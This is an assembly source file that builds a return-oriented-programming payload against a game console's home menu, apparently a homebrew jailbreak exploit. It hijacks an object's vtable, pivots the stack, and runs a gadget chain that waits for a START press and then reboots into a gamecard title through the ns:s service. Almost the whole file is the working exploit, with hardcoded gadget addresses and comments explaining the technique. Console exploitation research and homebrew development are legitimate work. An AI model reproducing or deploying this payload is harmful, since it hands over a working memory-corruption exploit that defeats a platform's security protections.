.nds

.include "../../build/constants.s"

.create "menu_payload.bin",0x0

MENU_OBJECT_LOC equ 0xBABE0000 ; for relocation

MENU_STACK_PIVOT equ 0x00100fb8 ; our stack pivot (found by yellows8) : ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc}
MENU_NOP equ 0x0010201c ; pop {pc}
MENU_NSS_REBOOT equ 0x00137390 ; ends in "add sp, sp, #0xc ; ldmfd sp!, {r4,r5,pc}"
MENU_NSS_HANDLE equ 0x0032e040
MENU_PAD equ 0x1000001C
MENU_KEYCOMBO equ 0x00000008 ; START
MENU_SLEEP equ 0x0012b044

; basically we overwrite an object's data to get home menu to do what we want
; first we overwrite the vtable pointer so that we can get the code to jump to where we want
; the method we use for that is located at vtable + 0x8
; with that we can put a in our vtable to our stack pivot
; our stack pivot works by loading a bunch of registers from [r4]
; fortunately we know r4 = object + 0x4, so we manufacture our object accordingly
; and then we get ROP under home menu ! from there we wait for keypress and then do ns:s reboot

.orga 0x0

	object:
		.word MENU_OBJECT_LOC + vtable - object ; pointer to manufactured vtable, and new sp
		.word MENU_NOP ; pc (pop {pc} to jump to ROP)

		.word 0xDEADCAFE ; filler to avoid having stuff overwritten
		.word 0xDEADCAFE ; filler to avoid having stuff overwritten
		.word 0xDEADCAFE ; filler to avoid having stuff overwritten
		.word 0xDEADCAFE ; filler to avoid having stuff overwritten

	vtable: ; also initial ROP
		.word 0x0012ccb8 ; pop {r4, r5, pc} : skip pivot
			.word 0xDEADBABE ; r4 (garbage)
			.word MENU_STACK_PIVOT ; stack pivot ; also r5 (garbage)
	rop: ; real ROP starts here
		; loop until keycombo pressed
		rop_loop:
			; load current PAD value
			.word 0x00157818 ; pop {r0, pc}
				.word MENU_PAD ; r0 (PAD)
			.word 0x0011f5d0 ; ldr r0, [r0] ; pop {r4, pc}
				.word MENU_KEYCOMBO ; r4 (keycombo)
			; mask it with desired key combo
  			.word 0x0011f148 ; and r0, r0, r4 ; pop {r4, r5, r6, r7, r8, pc}
				.word 0xDEADBABE ; r4 (garbage)
				.word 0xDEADBABE ; r5 (garbage)
				.word 0xDEADBABE ; r6 (garbage)
				.word 0xDEADBABE ; r7 (garbage)
				.word 0xDEADBABE ; r8 (garbage)
			; compare to keycombo value
			.word 0x00236efc ; pop {r1, pc}
				.word MENU_KEYCOMBO
  			.word 0x0021e6cc ; cmp r0, r1 ; mvnls r0, #0 ; movhi r0, #1 ; pop {r4, pc}
				.word 0xDEADBABE ; r4 (garbage)
			; overwrite stack pivot with NOP if equal
			.word 0x0015040c ; pop {r2, r3, r4, r5, r6, pc}
				.word MENU_OBJECT_LOC + loop_pivot - object - 0x30 ; r2 (destination - 0x30)
				.word 0xDEADBABE ; r3 (garbage)
				.word 0xDEADBABE ; r4 (garbage)
				.word MENU_NOP ; r5 (nop)
				.word 0xDEADBABE ; r6 (garbage)
			.word 0x001550fc ; streq r5, [r2, #0x30] ; pop {r4, r5, r6, pc}
				.word MENU_OBJECT_LOC + 4 - object ; r4 (pivot data location)
				.word 0xDEADBABE ; r5 (garbage)
				.word 0xDEADBABE ; r6 (garbage)
			; execute stack pivot to loop back only if we've hit the keycombo
			loop_pivot:
			.word MENU_STACK_PIVOT

		; NSS:Reboot
			.word 0x00157818 ; pop {r0, pc}
				.word 0x00000001 ; r0 (flag)
			.word 0x00236efc ; pop {r1, pc}
				.word nssRebootData + MENU_OBJECT_LOC - object ; r1 (PID followed by mediatype and reserved)
			.word 0x0015040c ; pop {r2, r3, r4, r5, r6, pc}
				.word 0x00000000 ; r2 (flag 2)
				.word 0xDEADBABE ; r3 (garbage)
				.word 0xDEADBABE ; r4 (garbage)
				.word 0xDEADBABE ; r5 (garbage)
				.word 0xDEADBABE ; r6 (garbage)
			.word MENU_NSS_REBOOT
				.word 0xDEADBABE ; (garbage)
				.word 0xDEADBABE ; (garbage)
				.word 0xDEADBABE ; (garbage)
				.word 0xDEADBABE ; r4 (garbage)
				.word 0xDEADBABE ; r5 (garbage)
			.word 0x00157818 ; pop {r0, pc}
				.word 0xFFFFFFFF ; r0
			.word 0x00236efc ; pop {r1, pc}
				.word 0x0FFFFFFF ; r1
			.word MENU_SLEEP

	nssRebootData:
		.word 0x00000000 ; lower word PID (0 for gamecard)
		.word 0x00000000 ; upper word PID
		.word 0x00000002 ; mediatype (2 for gamecard)
		.word 0x00000000 ; reserved

.Close
